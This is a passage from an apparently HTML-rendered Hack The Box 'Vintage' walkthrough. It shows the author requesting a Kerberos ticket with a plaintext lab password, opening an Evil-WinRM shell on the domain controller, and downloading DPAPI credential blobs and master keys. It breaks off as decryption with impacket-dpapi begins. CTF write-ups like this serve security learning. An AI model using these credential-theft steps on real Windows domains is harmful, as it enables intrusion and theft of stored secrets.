&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ getTGT.py vintage.htb/c.neri:Zer0the0ne -dc-ip vintage.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saving ticket in c.neri.ccache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ &lt;span class="nb">export&lt;/span> &lt;span class="nv">KRB5CCNAME&lt;/span>&lt;span class="o">=&lt;/span>c.neri.ccache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Then i will connect to the DC using &lt;code>evil-winrm&lt;/code> using the &lt;code>-r&lt;/code> flag.
And we retrieved the user&amp;rsquo;s flag.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/vintage-htb-writeup/Evil-WinRM.png"
width="960"
height="534"
srcset="https://r4z1o.github.io/p/vintage-htb-writeup/Evil-WinRM_hu_8af28ce73153d8ba.png 480w, https://r4z1o.github.io/p/vintage-htb-writeup/Evil-WinRM_hu_30c96fb88d5f3413.png 1024w"
loading="lazy"
alt="Evil-WinRM"
class="gallery-image"
data-flex-grow="179"
data-flex-basis="431px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ evil-winrm -i dc01.vintage.htb -r &lt;span class="s1">&amp;#39;vintage.htb&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Evil-WinRM shell v3.7
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method &lt;span class="sb">`&lt;/span>quoting_detection_proc&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="k">for&lt;/span> module Reline
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Info: Establishing connection to remote endpoint
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\C&lt;/span>.Neri&lt;span class="se">\D&lt;/span>ocuments&amp;gt; &lt;span class="nb">cd&lt;/span> ..&lt;span class="se">\D&lt;/span>esktop
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\C&lt;/span>.Neri&lt;span class="se">\D&lt;/span>esktop&amp;gt; &lt;span class="nb">type&lt;/span> user.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">8853092457944387a12897bef73bc3e8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\C&lt;/span>.Neri&lt;span class="se">\D&lt;/span>esktop&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>After a long time enumerating for any kind of privesc vectors either in &lt;code>Bloodhound&lt;/code> or using the shell i got, i finally found this hidden file which indicates the presence of Credentials protected using &lt;code>DPAPI&lt;/code>, which i downloaded on my local machine.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-PowerShell" data-lang="PowerShell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span>&lt;span class="nb">Evil-WinRM&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="nb">PS &lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Neri&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AppData&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Roaming&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Microsoft&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Credentials&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nb">mv &lt;/span>&lt;span class="n">C4BB96844A5C9DD45D5B6A9859252BA6&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">neri&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span>&lt;span class="nb">Evil-WinRM&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="nb">PS &lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Neri&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AppData&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Roaming&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Microsoft&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Credentials&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nb">dir &lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">neri&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Directory&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">neri&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Mode&lt;/span> &lt;span class="n">LastWriteTime&lt;/span> &lt;span class="n">Length&lt;/span> &lt;span class="n">Name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">----&lt;/span> &lt;span class="p">-------------&lt;/span> &lt;span class="p">------&lt;/span> &lt;span class="p">----&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">-a&lt;/span>&lt;span class="p">----&lt;/span> &lt;span class="mf">6&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">7&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">2024&lt;/span> &lt;span class="mf">1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">17&lt;/span> &lt;span class="n">PM&lt;/span> &lt;span class="mf">2312&lt;/span> &lt;span class="n">Microsoft&lt;/span> &lt;span class="n">Edge&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">lnk&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">-ar&lt;/span>&lt;span class="p">---&lt;/span> &lt;span class="mf">3&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">17&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">2025&lt;/span> &lt;span class="mf">12&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">02&lt;/span> &lt;span class="n">PM&lt;/span> &lt;span class="mf">34&lt;/span> &lt;span class="n">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span>&lt;span class="nb">Evil-WinRM&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="nb">PS &lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">neri&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">attrib&lt;/span> &lt;span class="n">-h&lt;/span> &lt;span class="n">-s&lt;/span> &lt;span class="n">C4BB96844A5C9DD45D5B6A9859252BA6&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span>&lt;span class="nb">Evil-WinRM&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="nb">PS &lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">neri&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">download&lt;/span> &lt;span class="n">C4BB96844A5C9DD45D5B6A9859252BA6&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Info&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">Downloading&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">neri&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">C4BB96844A5C9DD45D5B6A9859252BA6&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">C4BB96844A5C9DD45D5B6A9859252BA6&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Info&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">Download&lt;/span> &lt;span class="n">successful&lt;/span>&lt;span class="p">!&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>For now we still need the keys to decrypt these potential credentials. and for that we went to the &lt;code>Protect&lt;/code> directory where keys usually are found, and we found this directory with an &lt;code>SID&lt;/code> name.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-PowerShell" data-lang="PowerShell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span>&lt;span class="nb">Evil-WinRM&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="nb">PS &lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">neri&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nb">cd &lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Neri&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AppData&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Roaming&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Microsoft&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Protect&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span>&lt;span class="nb">Evil-WinRM&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="nb">PS &lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Neri&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AppData&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Roaming&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Microsoft&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Protect&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nb">dir
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Directory&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Neri&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AppData&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Roaming&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Microsoft&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Protect&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Mode&lt;/span> &lt;span class="n">LastWriteTime&lt;/span> &lt;span class="n">Length&lt;/span> &lt;span class="n">Name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">----&lt;/span> &lt;span class="p">-------------&lt;/span> &lt;span class="p">------&lt;/span> &lt;span class="p">----&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">d&lt;/span>&lt;span class="p">--&lt;/span>&lt;span class="n">-s&lt;/span>&lt;span class="p">-&lt;/span> &lt;span class="mf">6&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">7&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">2024&lt;/span> &lt;span class="mf">1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">17&lt;/span> &lt;span class="n">PM&lt;/span> &lt;span class="n">S&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">5&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">21&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">4024337825&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">2033394866&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">2055507597&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1115&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Inside this directory, we found 2 potential &lt;strong>Master keys&lt;/strong> which are &lt;code>4dbf04d8-529b-4b4c-b4ae-8e875e4fe847&lt;/code> and &lt;code>4dbf04d8-529b-4b4c-b4ae-8e875e4fe847&lt;/code>, which we will download locally for decryption.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-PowerShell" data-lang="PowerShell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span>&lt;span class="nb">Evil-WinRM&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="nb">PS &lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Neri&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AppData&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Roaming&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Microsoft&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Protect&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">S&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">5&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">21&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">4024337825&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">2033394866&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">2055507597&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1115&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nb">dir &lt;/span>&lt;span class="n">-h&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Directory&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Neri&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AppData&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Roaming&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Microsoft&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Protect&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">S&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">5&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">21&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">4024337825&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">2033394866&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">2055507597&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1115&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Mode&lt;/span> &lt;span class="n">LastWriteTime&lt;/span> &lt;span class="n">Length&lt;/span> &lt;span class="n">Name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">----&lt;/span> &lt;span class="p">-------------&lt;/span> &lt;span class="p">------&lt;/span> &lt;span class="p">----&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">-a-hs&lt;/span>&lt;span class="p">-&lt;/span> &lt;span class="mf">6&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">7&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">2024&lt;/span> &lt;span class="mf">1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">17&lt;/span> &lt;span class="n">PM&lt;/span> &lt;span class="mf">740&lt;/span> &lt;span class="n">4dbf04d8&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="n">529b&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="n">4b4c-b4ae&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="n">8e875e4fe847&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">-a-hs&lt;/span>&lt;span class="p">-&lt;/span> &lt;span class="mf">6&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">7&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">2024&lt;/span> &lt;span class="mf">1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">17&lt;/span> &lt;span class="n">PM&lt;/span> &lt;span class="mf">740&lt;/span> &lt;span class="n">99cf41a3-a552&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="n">4cf7-a8d7-aca2d6f7339b&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">-a-hs&lt;/span>&lt;span class="p">-&lt;/span> &lt;span class="mf">6&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">7&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">2024&lt;/span> &lt;span class="mf">1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">17&lt;/span> &lt;span class="n">PM&lt;/span> &lt;span class="mf">904&lt;/span> &lt;span class="nb">BK-VINTAGE&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">-a-hs&lt;/span>&lt;span class="p">-&lt;/span> &lt;span class="mf">6&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">7&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">2024&lt;/span> &lt;span class="mf">1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">17&lt;/span> &lt;span class="n">PM&lt;/span> &lt;span class="mf">24&lt;/span> &lt;span class="n">Preferred&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The first step involves decrypting the &lt;strong>Master Key&lt;/strong> using the &lt;code>impacket-dpapi&lt;/code> tool. The Master Key is encrypted and tied to the user&amp;rsquo;s &lt;code>SID&lt;/code> and password.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>MASTERKEYFILE&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Version : &lt;span class="m">2&lt;/span> &lt;span class="o">(&lt;/span>2&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Guid : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
